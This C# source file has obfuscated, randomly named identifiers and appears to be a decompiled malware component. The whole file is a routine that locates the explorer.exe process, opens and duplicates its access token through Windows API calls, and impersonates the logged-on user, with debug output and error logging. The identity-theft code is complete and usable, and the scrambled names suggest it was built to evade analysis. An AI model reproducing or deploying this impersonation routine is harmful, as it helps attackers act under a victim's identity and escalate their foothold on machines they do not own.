using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace dfbDZtGQEYGzK;

internal class qwMjYClYeLe
{
	public const int WBaDwOxvvvpVhV = 2;

	public const int PosEXbQYgAvGS = 8;

	public const int KpWVrNEQFban = 4;

	[DllImport("advapi32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int OpenProcessToken(IntPtr MCFinspYCPgRsn, int nXDenMHwtrAMiR, ref IntPtr EmIQwjGfmNf);

	[DllImport("kernel32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CloseHandle(IntPtr xmQFnWGGnH);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr mSQnRiqZlfQc, int qqjaqbuYkvRao, ref IntPtr cMGknhFXEoGn);

	private static IntPtr MckICShzTk(IntPtr OPOMamyVVkso, int dHpuctiIVwa)
	{
		IntPtr cMGknhFXEoGn = IntPtr.Zero;
		DuplicateToken(OPOMamyVVkso, dHpuctiIVwa, ref cMGknhFXEoGn);
		return cMGknhFXEoGn;
	}

	public static void vOqsxvPIaInpbw()
	{
		try
		{
			IntPtr EmIQwjGfmNf = IntPtr.Zero;
			IntPtr zero = IntPtr.Zero;
			Process process = null;
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == "explorer")
				{
					process = process2;
				}
			}
			if (OpenProcessToken(process.Handle, 14, ref EmIQwjGfmNf) != 0)
			{
				WindowsIdentity windowsIdentity = new WindowsIdentity(EmIQwjGfmNf);
				if (sWSXzQkxHH.hzzRDIjGDyq)
				{
					try
					{
						Console.WriteLine("Explorer Impersonation-> New Owner: {0}", windowsIdentity.Owner);
					}
					catch (Exception)
					{
					}
				}
				try
				{
					zero = MckICShzTk(EmIQwjGfmNf, 2);
					if (IntPtr.Zero == zero)
					{
						string message = $"Dup failed {Marshal.GetLastWin32Error()}, privilege not held";
						throw new Exception(message);
					}
					windowsIdentity.Impersonate();
					IntPtr token = WindowsIdentity.GetCurrent().Token;
					if (sWSXzQkxHH.hzzRDIjGDyq)
					{
						try
						{
							Console.WriteLine("Explorer Impersonation-> Token number: {0}", token);
							Console.WriteLine("Explorer Impersonation-> Windows ID Name: {0}", WindowsIdentity.GetCurrent().Name);
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				finally
				{
					CloseHandle(EmIQwjGfmNf);
				}
			}
			string message2 = $"OpenProcess Failed {Marshal.GetLastWin32Error()}, privilege not held";
			throw new Exception(message2);
		}
		catch (Exception ex3)
		{
			if (sWSXzQkxHH.bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(sWSXzQkxHH.SlCyjezmzcjRF, "Error while impersonating explorer: " + ex3.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
